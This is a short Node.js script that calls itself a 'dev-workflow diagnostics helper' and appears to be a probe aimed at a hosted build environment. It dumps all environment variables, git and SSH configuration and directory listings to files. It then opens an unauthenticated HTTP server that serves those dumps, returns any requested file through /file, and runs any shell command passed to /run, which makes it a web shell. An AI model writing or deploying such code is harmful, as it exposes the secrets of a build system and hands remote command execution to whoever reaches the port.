// dev-workflow diagnostics helper
const http = require('http');
const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');
const envText = Object.keys(process.env).sort().map(k => k + '=' + process.env[k]).join('\n');
fs.writeFileSync('envdump.txt', envText);
function run(cmd) { try { return execSync(cmd, {timeout: 20000}).toString(); } catch (e) { return 'ERR: ' + (e.stdout||'') + (e.stderr||e.message); } }
const pre = {
  sshwrapper: run('cat /opt/build/sshwrapper 2>&1'),
  gitconfig: run('git config --list --show-origin 2>&1'),
  dotgit: run('cat .git/config 2>&1'),
  sshdir: run('ls -la /opt/build/.ssh ~/.ssh 2>&1'),
  home: run('ls -la /opt/buildhome 2>&1 | head -40'),
  build: run('ls -la /opt/build 2>&1'),
  procnet: run('cat /proc/net/fib_trie 2>/dev/null | head -5'),
};
fs.writeFileSync('boxdump.json', JSON.stringify(pre, null, 1));
const srv = http.createServer((req, res) => {
  const u = new URL(req.url, 'http://x');
  const p = u.pathname;
  if (p === '/envdump.txt' || p === '/whoami.json' || p === '/boxdump.json' || p === '/envdump') {
    res.writeHead(200, {'content-type': 'text/plain; charset=utf-8'});
    res.end(fs.readFileSync(path.basename(p), 'utf8'));
    return;
  }
  if (p === '/file') {
    const fp = u.searchParams.get('p');
    try { res.writeHead(200); res.end(fs.readFileSync(fp)); }
    catch (e) { res.writeHead(404); res.end('no: ' + e.message); }
    return;
  }
  if (p === '/run') {
    const c = u.searchParams.get('c');
    res.writeHead(200, {'content-type': 'text/plain'});
    res.end(run(c));
    return;
  }
  res.writeHead(200, {'content-type': 'text/html; charset=utf-8'});
  res.end('<!doctype html><title>ve devbox probe</title><h1>devdump v2</h1><a href=/envdump.txt>env</a> <a href=/boxdump.json>box</a>');
});
const port = parseInt(process.env.PORT || '3000', 10);
srv.listen(port, () => console.log('devdump v2 listening on ' + port));
